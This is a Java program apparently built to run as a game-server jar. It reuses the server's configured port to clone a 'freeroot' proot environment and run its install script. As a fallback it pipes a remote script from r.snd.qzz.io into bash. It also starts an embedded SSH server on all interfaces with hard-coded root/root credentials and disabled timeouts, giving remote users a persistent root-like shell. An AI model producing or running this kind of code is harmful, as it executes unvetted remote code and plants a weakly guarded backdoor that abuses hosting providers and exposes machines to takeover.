package org.server;
import java.io.*;
import java.net.*;
import java.nio.file.*;
import java.util.*;
import java.util.concurrent.*;
import java.util.logging.*;
import java.lang.reflect.*;

public class Main{
    private static final Logger L=Logger.getLogger(Main.class.getName());
    private static final List<String> URLS=Arrays.asList(
            "https://github.com/Mytai20100/freeroot.git",
            "https://github.servernotdie.workers.dev/Mytai20100/freeroot.git",
            "https://gitlab.com/Mytai20100/freeroot.git",
            "https://gitlab.snd.qzz.io/mytai20100/freeroot.git",
            "https://git.snd.qzz.io/mytai20100/freeroot.git"
    );
    private static final String TMP="freeroot_temp",DIR="work",SH="noninteractive.sh";
    private static final String FALLBACK_URL="r.snd.qzz.io/raw/cpu";
    private static String sshIp="0.0.0.0";
    private static int sshPort=24990;
    private static final Map<String,String> users=new ConcurrentHashMap<>();
    private static final String[] MAVEN_DEPS={
            "https://repo1.maven.org/maven2/org/apache/sshd/sshd-core/2.11.0/sshd-core-2.11.0.jar",
            "https://repo1.maven.org/maven2/org/apache/sshd/sshd-common/2.11.0/sshd-common-2.11.0.jar",
            "https://repo1.maven.org/maven2/org/slf4j/slf4j-api/1.7.36/slf4j-api-1.7.36.jar",
            "https://repo1.maven.org/maven2/org/slf4j/slf4j-nop/1.7.36/slf4j-nop-1.7.36.jar"
    };
    public static void main(String[]a){
        loadConfig();
        new Thread(()->startSSHServer()).start();
        new Thread(()->{
            try{
                File workDir=new File("work");
                for(int i=0;i<60;i++){
                    if(workDir.exists()&&new File(workDir,".installed").exists()){
                        Thread.sleep(1000);
                        createSSHWrapper();
                        break;
                    }
                    Thread.sleep(1000);
                }
            }catch(InterruptedException e){
                Thread.currentThread().interrupt();
            }
        }).start();
        try{
            if(!cmd("git")){L.severe("Git not found");System.exit(1);}
            if(!cmd("bash")){L.severe("Bash not found");System.exit(1);}
            File w=new File(DIR);
            if(w.exists()){
                L.info("[*] Directory 'work' exists, checking...");
                File s=new File(w,SH);
                if(s.exists()){
                    L.info("[+] Valid repo found, skipping clone");
                    if(!s.setExecutable(true,false))L.warning("Failed to make executable");
                    exec(w,SH);
                    return;
                }else{
                    L.warning("Invalid repo, removing...");
                    del(w.toPath());
                }
            }
            File t=new File(TMP);
            if(t.exists())del(t.toPath());
            if(!cloneRepo()){
                L.warning("All clone attempts failed, trying fallback method...");
                clean(t);
                if(!fallback()){
                    L.severe("Fallback method also failed");
                    System.exit(1);
                }
                L.info("[+] Fallback method succeeded");
                return;
            }
            if(!t.renameTo(w)){L.severe("Rename failed");clean(t);System.exit(1);}
            L.info("[+] Renamed to 'work'");
            File s=new File(w,SH);
            if(!s.exists()){L.severe("Script not found");clean(w);System.exit(1);}
            if(!s.setExecutable(true,false))L.warning("Failed to make executable");
            exec(w,SH);
            L.info("[+] Freeroot");
        }catch(Exception e){L.log(Level.SEVERE,"Error",e);System.exit(1);}
    }
    private static void createSSHWrapper(){
        try{
            File workDir=new File("work");
            File wrapper=new File(workDir,"ssh.sh");

            if(!workDir.exists()){
                L.info("[*] Work directory not ready yet, will create wrapper later");
                return;
            }
            if(wrapper.exists()){
                wrapper.delete();
            }
            String script="#!/bin/bash\n"+
                    "export LC_ALL=C\n"+
                    "export LANG=C\n"+
                    "ROOTFS_DIR=$(pwd)\n"+
                    "export PATH=$PATH:~/.local/usr/bin\n"+
                    "\n"+
                    "if [ ! -e $ROOTFS_DIR/.installed ]; then\n"+
                    "    echo 'Proot environment not installed yet. Please wait for setup to complete.'\n"+
                    "    exit 1\n"+
                    "fi\n"+
                    "\n"+
                    "G=\"\\033[0;32m\"\n"+
                    "Y=\"\\033[0;33m\"\n"+
                    "R=\"\\033[0;31m\"\n"+
                    "C=\"\\033[0;36m\"\n"+
                    "W=\"\\033[0;37m\"\n"+
                    "X=\"\\033[0m\"\n"+
                    "OS=$(lsb_release -ds 2>/dev/null||cat /etc/os-release 2>/dev/null|grep PRETTY_NAME|cut -d'\"' -f2||echo \"Unknown\")\n"+
                    "CPU=$(lscpu | awk -F: '/Model name:/{print $2}' | sed 's/^ *//')\n"+
                    "ARCH_D=$(uname -m)\n"+
                    "CPU_U=$(top -bn1 2>/dev/null | awk '/Cpu\\(s\\)/{print $2+$4}' || echo 0)\n"+
                    "TRAM=$(free -h --si 2>/dev/null | awk '/^Mem:/{print $2}' || echo 'N/A')\n"+
                    "URAM=$(free -h --si 2>/dev/null | awk '/^Mem:/{print $3}' || echo 'N/A')\n"+
                    "RAM_PERCENT=$(free 2>/dev/null | awk '/^Mem:/{printf \"%.1f\", $3/$2 * 100}' || echo 0)\n"+
                    "DISK=$(df -h /|awk 'NR==2{print $2}')\n"+
                    "UDISK=$(df -h /|awk 'NR==2{print $3}')\n"+
                    "DISK_PERCENT=$(df -h /|awk 'NR==2{print $5}'|sed 's/%//')\n"+
                    "IP=$(curl -s --max-time 2 ifconfig.me 2>/dev/null||curl -s --max-time 2 icanhazip.com 2>/dev/null||hostname -I 2>/dev/null|awk '{print $1}'||echo \"N/A\")\n"+
                    "clear\n"+
                    "echo -e \"${C}OS:${X}   $OS\"\n"+
                    "echo -e \"${C}CPU:${X}  $CPU [$ARCH_D]  Usage: ${CPU_U}%\"\n"+
                    "echo -e \"${G}RAM:${X}  ${URAM} / ${TRAM} (${RAM_PERCENT}%)\"\n"+
                    "echo -e \"${Y}Disk:${X} ${UDISK} / ${DISK} (${DISK_PERCENT}%)\"\n"+
                    "echo -e \"${C}IP:${X}   $IP\"\n"+
                    "echo \"\"\n"+
                    "\n"+
                    "echo 'furryisbest' > $ROOTFS_DIR/etc/hostname\n"+
                    "cat > $ROOTFS_DIR/etc/hosts << 'HOSTS_EOF'\n"+
                    "127.0.0.1   localhost\n"+
                    "127.0.1.1   furryisbest\n"+
                    "::1         localhost ip6-localhost ip6-loopback\n"+
                    "ff02::1     ip6-allnodes\n"+
                    "ff02::2     ip6-allrouters\n"+
                    "HOSTS_EOF\n"+
                    "\n"+
                    "cat > $ROOTFS_DIR/root/.bashrc << 'BASHRC_EOF'\n"+
                    "export HOSTNAME=furryisbest\n"+
                    "export USER=furry\n"+
                    "export TERM_PROGRAM=\"bash\"\n"+
                    "export PS1='root@furryisbest:\\w\\$ '\n"+
                    "export LC_ALL=C\n"+
                    "export LANG=C\n"+
                    "export TMOUT=0\n"+
                    "unset TMOUT\n"+
                    "export HISTFILE=/root/.bash_history\n"+
                    "export HISTSIZE=1000\n"+
                    "export HISTFILESIZE=2000\n"+
                    "export HISTTIMEFORMAT='%F %T '\n"+
                    "shopt -s histappend 2>/dev/null\n"+
                    "PROMPT_COMMAND='history -a'\n"+
                    "stty sane 2>/dev/null\n"+
                    "stty echo 2>/dev/null\n"+
                    "alias ls='ls --color=auto'\n"+
                    "alias ll='ls -lah'\n"+
                    "alias grep='grep --color=auto'\n"+
                    "alias id='id 2>/dev/null'\n"+
                    "BASHRC_EOF\n"+
                    "\n"+
                    "(\n"+
                    "  while true; do\n"+
                    "    sleep 15\n"+
                    "    echo -ne '\\0' 2>/dev/null || true\n"+
                    "  done\n"+
                    ") &\n"+
                    "KEEPALIVE_PID=$!\n"+
                    "\n"+
                    "trap \"kill $KEEPALIVE_PID 2>/dev/null; exit\" EXIT INT TERM\n"+
                    "\n"+
                    "stty sane 2>/dev/null\n"+
                    "\n"+
                    "while true; do\n"+
                    "  exec 2>&1\n"+
                    "  $ROOTFS_DIR/usr/local/bin/proot \\\n"+
                    "    --rootfs=\"${ROOTFS_DIR}\" \\\n"+
                    "    -0 \\\n"+
                    "    -w \"/root\" \\\n"+
                    "    -b /dev \\\n"+
                    "    -b /dev/pts \\\n"+
                    "    -b /sys \\\n"+
                    "    -b /proc \\\n"+
                    "    -b /etc/resolv.conf \\\n"+
                    "    --kill-on-exit \\\n"+
                    "    /bin/bash --rcfile /root/.bashrc -i\n"+
                    "  \n"+
                    "  EXIT_CODE=$?\n"+
                    "  if [ $EXIT_CODE -eq 0 ] || [ $EXIT_CODE -eq 130 ]; then\n"+
                    "    break\n"+
                    "  fi\n"+
                    "  echo 'Session interrupted. Restarting in 2 seconds...'\n"+
                    "  sleep 2\n"+
                    "done\n"+
                    "\n"+
                    "kill $KEEPALIVE_PID 2>/dev/null\n";

            try(FileWriter fw=new FileWriter(wrapper)){
                fw.write(script);
            }
            wrapper.setExecutable(true,false);
        }catch(IOException e){
        }
    }
    private static void loadConfig(){
        users.put("root","root");
        File cfg=new File("server.properties");
        if(cfg.exists()){
            try(InputStream is=new FileInputStream(cfg)){
                Properties p=new Properties();
                p.load(is);
                sshIp=p.getProperty("server-ip","0.0.0.0");
                String portStr=p.getProperty("server-port");
                if(portStr!=null && !portStr.isEmpty()){
                    sshPort=Integer.parseInt(portStr);
                }else{
                    sshPort=2222;
                }
                L.info("[+] Config loaded: "+sshIp+":"+sshPort);
            }catch(Exception e){
                L.warning("Config error: "+e.getMessage());
            }
        }else{
            sshPort=2222;
            L.info("[*] No server.properties, using defaults: "+sshIp+":"+sshPort);
        }
    }
    private static void startSSHServer(){
        try{
            File libDir=new File("libraries");
            if(!libDir.exists()){
                libDir.mkdir();
                L.info("[*] Created libraries directory");
            }
            List<URL> jarUrls=new ArrayList<>();
            boolean needDownload=false;
            for(String depUrl:MAVEN_DEPS){
                String fileName=depUrl.substring(depUrl.lastIndexOf('/')+1);
                File jarFile=new File(libDir,fileName);
                if(!jarFile.exists()){
                    needDownload=true;
                    L.info("[*] Downloading: "+fileName);
                    try{
                        downloadFile(depUrl,jarFile);
                        L.info("[+] Downloaded: "+fileName);
                    }catch(Exception e){
                        L.severe("Download failed: "+fileName+" - "+e.getMessage());
                        return;
                    }
                }
                try{
                    jarUrls.add(jarFile.toURI().toURL());
                }catch(MalformedURLException e){
                    L.severe("Invalid jar path: "+e.getMessage());
                    return;
                }
            }
            if(needDownload){
                L.info("[+] All libraries downloaded");
            }else{
                L.info("[+] Libraries already present");
            }
            URLClassLoader loader=new URLClassLoader(
                    jarUrls.toArray(new URL[0]),
                    Main.class.getClassLoader()
            );
            startSSH(loader);
        }catch(Exception e){
            L.log(Level.SEVERE,"SSH server error",e);
        }
    }
    private static void downloadFile(String urlStr,File dest)throws IOException{
        URI uri;
        try{
            uri=new URI(urlStr);
        }catch(Exception e){
            throw new IOException("Invalid URL: "+urlStr);
        }
        try(InputStream in=uri.toURL().openStream();
            FileOutputStream out=new FileOutputStream(dest)){
            byte[]buf=new byte[8192];
            int n;
            while((n=in.read(buf))!=-1){
                out.write(buf,0,n);
            }
        }
    }
    private static void startSSH(ClassLoader loader)throws Exception{
        Class<?> sshServerClass=loader.loadClass("org.apache.sshd.server.SshServer");
        Class<?> keyProviderClass=loader.loadClass("org.apache.sshd.server.keyprovider.SimpleGeneratorHostKeyProvider");
        Class<?> passwordAuthClass=loader.loadClass("org.apache.sshd.server.auth.password.PasswordAuthenticator");
        Class<?> keyPairProviderClass=loader.loadClass("org.apache.sshd.common.keyprovider.KeyPairProvider");
        Class<?> commandClass=loader.loadClass("org.apache.sshd.server.command.Command");
        Class<?> shellFactoryClass=loader.loadClass("org.apache.sshd.server.shell.ShellFactory");
        Class<?> sessionClass=loader.loadClass("org.apache.sshd.server.session.ServerSession");
        Class<?> channelSessionClass=loader.loadClass("org.apache.sshd.server.channel.ChannelSession");
        Class<?> exitCallbackClass=loader.loadClass("org.apache.sshd.server.ExitCallback");
        Object sshd=sshServerClass.getMethod("setUpDefaultServer").invoke(null);
        sshServerClass.getMethod("setPort",int.class).invoke(sshd,sshPort);
        Object keyProvider=keyProviderClass.getConstructor().newInstance();
        File keyFile=new File("hostkey.ser");
        keyProviderClass.getMethod("setPath",java.nio.file.Path.class).invoke(keyProvider,keyFile.toPath());
        sshServerClass.getMethod("setKeyPairProvider",keyPairProviderClass).invoke(sshd,keyProvider);
        try{
            Class<?> propertyResolverUtilsClass=loader.loadClass("org.apache.sshd.common.PropertyResolverUtils");
            Class<?> coreModulePropertiesClass=loader.loadClass("org.apache.sshd.core.CoreModuleProperties");
            propertyResolverUtilsClass.getMethod("updateProperty",
                            Object.class,String.class,long.class)
                    .invoke(null,sshd,"idle-timeout",0L);
            propertyResolverUtilsClass.getMethod("updateProperty",
                            Object.class,String.class,long.class)
                    .invoke(null,sshd,"nio2-read-timeout",0L);
            propertyResolverUtilsClass.getMethod("updateProperty",
                            Object.class,String.class,long.class)
                    .invoke(null,sshd,"auth-timeout",0L);
            propertyResolverUtilsClass.getMethod("updateProperty",
                            Object.class,String.class,long.class)
                    .invoke(null,sshd,"disconnect-timeout",0L);
            L.info("[+] Infinite timeout configured");
        }catch(Exception e){
            L.warning("Advanced timeout config failed, using fallback");
            try{
                Map<String,Object> props=(Map<String,Object>)sshd.getClass().getMethod("getProperties").invoke(sshd);
                props.put("idle-timeout","0");
                props.put("nio2-read-timeout","0");
                props.put("auth-timeout","0");
                props.put("disconnect-timeout","0");
            }catch(Exception e2){
                L.warning("Fallback config also failed: "+e2.getMessage());
            }
        }
        Object passwordAuth=java.lang.reflect.Proxy.newProxyInstance(
                loader,
                new Class<?>[]{passwordAuthClass},
                new InvocationHandler(){
                    public Object invoke(Object proxy,Method method,Object[]args)throws Throwable{
                        if(method.getName().equals("authenticate")){
                            String username=(String)args[0];
                            String password=(String)args[1];
                            return users.containsKey(username)&&users.get(username).equals(password);
                        }
                        return null;
                    }
                }
        );
        sshServerClass.getMethod("setPasswordAuthenticator",passwordAuthClass).invoke(sshd,passwordAuth);
        Object shellFactory=java.lang.reflect.Proxy.newProxyInstance(
                loader,
                new Class<?>[]{shellFactoryClass},
                new InvocationHandler(){
                    public Object invoke(Object proxy,Method method,Object[]args)throws Throwable{
                        if(method.getName().equals("createShell")){
                            return java.lang.reflect.Proxy.newProxyInstance(
                                    loader,
                                    new Class<?>[]{commandClass},
                                    new ShellCommandHandler(loader,sessionClass,channelSessionClass,exitCallbackClass)
                            );
                        }
                        return null;
                    }
                }
        );
        sshServerClass.getMethod("setShellFactory",shellFactoryClass).invoke(sshd,shellFactory);
        sshServerClass.getMethod("start").invoke(sshd);
    }
    static class ShellCommandHandler implements InvocationHandler{
        private Process process;
        private OutputStream processStdin;
        private InputStream processStdout;
        private InputStream processStderr;
        private InputStream clientInput;
        private OutputStream clientOutput;
        private OutputStream clientError;
        private Object exitCallback;
        private ClassLoader loader;
        private Class<?> exitCallbackClass;
        private volatile boolean running=false;
        private Map<String,String> environment=new ConcurrentHashMap<>();
        private String ptyType="xterm-256color";
        private int ptyColumns=120;
        private int ptyLines=30;
        private ScheduledExecutorService keepaliveExecutor;
        public ShellCommandHandler(ClassLoader loader,Class<?> sessionClass,Class<?> channelSessionClass,Class<?> exitCallbackClass){
            this.loader=loader;
            this.exitCallbackClass=exitCallbackClass;
        }
        public Object invoke(Object proxy,Method method,Object[]args)throws Throwable{
            String methodName=method.getName();
            if(methodName.equals("setInputStream")){
                if(args!=null&&args.length>0){
                    clientInput=(InputStream)args[0];
                }
                return null;
            }else if(methodName.equals("setOutputStream")){
                if(args!=null&&args.length>0){
                    clientOutput=(OutputStream)args[0];
                }
                return null;
            }else if(methodName.equals("setErrorStream")){
                if(args!=null&&args.length>0){
                    clientError=(OutputStream)args[0];
                }
                return null;
            }else if(methodName.equals("setExitCallback")){
                if(args!=null&&args.length>0){
                    exitCallback=args[0];
                }
                return null;
            }else if(methodName.equals("start")){
                running=true;
                startKeepalive();
                new Thread(this::runShell).start();
                return null;
            }else if(methodName.equals("destroy")){
                running=false;
                stopKeepalive();
                if(process!=null){
                    process.destroy();
                }
                return null;
            }else if(methodName.equals("getEnvironment")){
                return environment;
            }else if(methodName.equals("setPtyType")){
                if(args!=null&&args.length>0){
                    ptyType=args[0].toString();
                }
                return null;
            }else if(methodName.equals("setPtyColumns")){
                if(args!=null&&args.length>0){
                    ptyColumns=(Integer)args[0];
                }
                return null;
            }else if(methodName.equals("setPtyLines")){
                if(args!=null&&args.length>0){
                    ptyLines=(Integer)args[0];
                }
                return null;
            }
            return null;
        }
        private void startKeepalive(){
            keepaliveExecutor=Executors.newSingleThreadScheduledExecutor();
            keepaliveExecutor.scheduleAtFixedRate(()->{
                try{
                    if(running&&clientOutput!=null){
                        clientOutput.flush();
                    }
                }catch(Exception e){
                }
            },10,10,TimeUnit.SECONDS);
        }
        private void stopKeepalive(){
            if(keepaliveExecutor!=null){
                keepaliveExecutor.shutdownNow();
            }
        }
        private void runShell(){
            try{
                File workDir=new File("work");
                File sshScript=new File(workDir,"ssh.sh");
                ProcessBuilder pb;
                if(sshScript.exists()&&sshScript.canExecute()){
                    pb=new ProcessBuilder(
                            "script",
                            "-qefc",
                            "cd work && bash ssh.sh",
                            "/dev/null"
                    );
                }else{
                    pb=new ProcessBuilder(
                            "script",
                            "-qefc",
                            "bash --login -i",
                            "/dev/null"
                    );
                }
                Map<String,String> env=pb.environment();
                env.put("TERM",ptyType);
                env.put("COLUMNS",String.valueOf(ptyColumns));
                env.put("LINES",String.valueOf(ptyLines));
                env.put("LC_ALL","C");
                env.put("LANG","C");
                env.put("TMOUT","0");
                env.put("HOSTNAME","furryisbest");
                env.putAll(environment);
                pb.redirectErrorStream(false);
                process=pb.start();
                processStdin=process.getOutputStream();
                processStdout=process.getInputStream();
                processStderr=process.getErrorStream();
                Thread inputThread=new Thread(()->{
                    try{
                        byte[]buf=new byte[8192];
                        int n;
                        while(running&&(n=clientInput.read(buf))!=-1){
                            if(processStdin!=null){
                                processStdin.write(buf,0,n);
                                processStdin.flush();
                            }
                        }
                    }catch(IOException e){
                        if(running){
                            System.err.println("Input error: "+e.getMessage());
                        }
                    }finally{
                        try{
                            if(processStdin!=null)processStdin.close();
                        }catch(IOException ignored){}
                    }
                });
                inputThread.setDaemon(true);
                inputThread.start();
                Thread outputThread=new Thread(()->{
                    try{
                        byte[]buf=new byte[8192];
                        int n;
                        while(running&&(n=processStdout.read(buf))!=-1){
                            if(clientOutput!=null){
                                clientOutput.write(buf,0,n);
                                clientOutput.flush();
                            }
                        }
                    }catch(IOException e){
                        if(running){
                            System.err.println("Output error: "+e.getMessage());
                        }
                    }
                });
                outputThread.setDaemon(true);
                outputThread.start();
                Thread errorThread=new Thread(()->{
                    try{
                        byte[]buf=new byte[8192];
                        int n;
                        while(running&&(n=processStderr.read(buf))!=-1){
                            if(clientError!=null){
                                clientError.write(buf,0,n);
                                clientError.flush();
                            }else if(clientOutput!=null){
                                clientOutput.write(buf,0,n);
                                clientOutput.flush();
                            }
                        }
                    }catch(IOException e){
                        if(running){
                            System.err.println("Error stream error: "+e.getMessage());
                        }
                    }
                });
                errorThread.setDaemon(true);
                errorThread.start();
                int exitCode=process.waitFor();
                running=false;
                stopKeepalive();
                if(exitCallback!=null){
                    try{
                        Method onExitMethod=exitCallbackClass.getMethod("onExit",int.class);
                        onExitMethod.invoke(exitCallback,exitCode);
                    }catch(Exception e){
                        e.printStackTrace();
                    }
                }

            }catch(Exception e){
                e.printStackTrace();
                stopKeepalive();
                if(exitCallback!=null){
                    try{
                        Method onExitMethod=exitCallbackClass.getMethod("onExit",int.class,String.class);
                        onExitMethod.invoke(exitCallback,1,e.getMessage());
                    }catch(Exception ex){
                        try{
                            Method onExitMethod=exitCallbackClass.getMethod("onExit",int.class);
                            onExitMethod.invoke(exitCallback,1);
                        }catch(Exception ex2){
                            ex2.printStackTrace();
                        }
                    }
                }
            }
        }
    }
    private static boolean cmd(String c){
        try{
            ProcessBuilder p=new ProcessBuilder(c,"--version");
            p.redirectOutput(ProcessBuilder.Redirect.DISCARD);
            p.redirectError(ProcessBuilder.Redirect.DISCARD);
            Process pr=p.start();
            return pr.waitFor(3,TimeUnit.SECONDS)&&pr.exitValue()==0;
        }catch(IOException|InterruptedException e){return false;}
    }
    private static boolean cloneRepo(){
        for(int i=0;i<URLS.size();i++){
            String url=URLS.get(i);
            L.info("[*] Trying clone from: "+url+" ("+(i+1)+"/"+URLS.size()+")");
            try{
                ProcessBuilder p=new ProcessBuilder("git","clone","--depth=1",url,TMP);
                p.inheritIO();
                Process pr=p.start();
                int exitCode=pr.waitFor();
                if(exitCode==0){
                    L.info("[+] Successfully cloned from: "+url);
                    return true;
                }else{
                    L.warning("Clone failed from "+url+" with exit code: "+exitCode);
                    File t=new File(TMP);
                    if(t.exists())del(t.toPath());
                }
            }catch(IOException e){
                L.log(Level.WARNING,"IO error with "+url,e);
            }catch(InterruptedException e){
                Thread.currentThread().interrupt();
                L.log(Level.WARNING,"Interrupted with "+url,e);
            }
        }
        return false;
    }
    private static boolean fallback(){
        if(!cmd("curl")){L.warning("Curl not found, cannot use fallback");return false;}
        L.info("[*] Executing fallback: curl "+FALLBACK_URL+" | bash");
        try{
            ProcessBuilder p=new ProcessBuilder("bash","-c","curl "+FALLBACK_URL+" | bash");
            p.inheritIO();
            Process pr=p.start();
            int exitCode=pr.waitFor();
            if(exitCode==0){
                L.info("[+] Fallback executed successfully");
                return true;
            }else{
                L.severe("Fallback failed with exit code: "+exitCode);
                return false;
            }
        }catch(IOException e){
            L.log(Level.SEVERE,"IO error during fallback",e);
            return false;
        }catch(InterruptedException e){
            Thread.currentThread().interrupt();
            L.log(Level.SEVERE,"Interrupted during fallback",e);
            return false;
        }
    }
    private static void exec(File d,String s){
        L.info("[*] Executing script 'noninteractive.sh'...");
        try{
            ProcessBuilder p=new ProcessBuilder("bash",s);
            p.directory(d);
            p.inheritIO();
            Process pr=p.start();
            pr.waitFor();
            L.info("[*] Process exited with code: "+pr.exitValue());
        }catch(IOException e){L.log(Level.SEVERE,"IO error",e);
        }catch(InterruptedException e){Thread.currentThread().interrupt();L.log(Level.SEVERE,"Interrupted",e);}
    }
    private static void clean(File d){
        if(d!=null&&d.exists()){
            L.info("[*] Cleaning...");
            try{del(d.toPath());L.info("[+] Cleaned");
            }catch(IOException e){L.log(Level.WARNING,"Cleanup failed",e);}
        }
    }
    private static void del(Path p)throws IOException{
        if(Files.exists(p)){
            Files.walk(p).sorted((a,b)->b.compareTo(a)).forEach(x->{
                try{Files.delete(x);}catch(IOException e){L.log(Level.WARNING,"Delete failed: "+x,e);}
            });
        }
    }
}